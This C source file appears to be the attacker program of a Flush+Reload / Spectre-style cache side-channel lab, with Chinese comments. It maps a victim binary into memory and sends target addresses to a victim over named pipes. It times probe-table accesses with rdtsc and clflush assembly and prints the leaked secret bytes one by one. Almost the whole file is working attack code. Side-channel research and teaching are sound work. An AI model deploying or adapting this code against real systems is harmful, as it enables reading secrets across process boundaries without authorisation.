#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <x86intrin.h>
#include "common.h"

#define A_V "av_fifo"
#define V_A "va_fifo"

char hint[256] = {'x'};

int THRESHOLD;

int probe(char *adrs) {
    volatile unsigned long time;
    asm __volatile__ (
                    " mfence\n"
                    " lfence\n"
                    " rdtsc\n"
                    " lfence\n"
                    " movl %%eax, %%esi \n"
                    " movl (%1), %%eax\n"
                    " lfence\n"
                    " rdtsc\n"
                    " subl %%esi, %%eax \n"
                    " clflush 0(%1)\n"
                    "nop\n"
                    "nop\n"
                    "nop\n"
                    "nop\n"
                    : "=a" (time)
                    : "c" (adrs)
                    : "%esi", "%edx");
                    return time < THRESHOLD;
}

/**
 * 参数：victim文件名、secret地址(0x6310a0)、信息长度、THRESHOLD
*/
int main(int argc, char *argv[]){
    int pip_av, pip_va;
    int a, index;
    int fd, i, j, k = 5;
    char max1 = 0xff, max2 = 0xff, temp = 0xff;
    unsigned secret, length, end;
    register uint64_t time1, time2;
    char buffer[1024];
    char addr[10];
    char *exe;
    char *mm;
    char *address;

    if(argc != 5){
        fprintf(stderr, "error in %s, lines %d", __FILE__, __LINE__);
        exit(EXIT_FAILURE);
    }

    exe = argv[1];                                      //victim
    secret = get_long(argv[2]);
    length = get_long(argv[3]);
    THRESHOLD = get_long(argv[4]);
    end = secret + length;

    printf("Secret offset: %x, length: %d\n", secret, length);

    fd = open(exe, O_RDONLY, 0666);
    mm = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, fd, 0x20000);    //victim文件偏移0x20000处只读共享映射到进程中
    if(mm == MAP_FAILED){
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    sleep(5);
    pip_av = open(A_V, O_WRONLY);
    pip_va = open(V_A, O_RDONLY);

    if((pip_av != -1) && (pip_va != -1)){
        /*TODO*/
        for(; secret < end; secret++){
            memset(hint, '\0', sizeof(hint));
            for(i = 0; i < 256; i++)                   //刷新ProbeTable
                _mm_clflush(mm + 256 * i);

            for(volatile int z = 0; z < 200; z++){}     //延迟
            for(i = 0; i < 100; i++){
                while(k > 0){
                    sprintf(addr, "0x%x", secret);        //发送5次
                    write(pip_av, addr, 10);
                    read(pip_va, buffer, 1024);
                    memset(addr, '\0', 10);
                    k--;
                }
                k = 5;
                for(j = 0; j < 256; j++){
                    index = (j * 167 + 13) & 255;       //伪随机访问，防止访问相邻缓存行导致不可预知的后果
                    address = &mm[index * 256];
                    if(probe(address)){
                        hint[index]++;
                    }
//                    time1 = _rdtscp(&a);
//                    a = *address;                       //测试访问内存的时间
//                    time2 = _rdtscp(&a) - time1;
//                    _mm_clflush(address);               
//                    if(time2 < THRESHOLD){              //如果访问时间低于阈值且排除掉训练分支时加载的缓存行
//                        hint[index]++;
//                    }
                }
            }
            for(i = 0; i < 256; i++){
                if(hint[i] > (int)temp){
                    temp = hint[i];
                    max2 = max1;                        //可能性次之
                    max1 = i;                           //可能性最大的结果
                }
            }
            printf("0x%x='%c'", max1, (max1 > 31 && max1 < 127) ? max1 : "?");
            if(max2 != -1)
                printf("    possible 0x%x='%c'", max2, (max2 > 31 && max2 < 127) ? max2 : "?");
            printf("\n");
            fflush(stdout);
        }
    }
    else{
        fprintf(stderr, "Open fifo failed");
        exit(EXIT_FAILURE);
    }
    munmap(mm, 0x10000);                                //解除文件映射
    exit(EXIT_SUCCESS);
}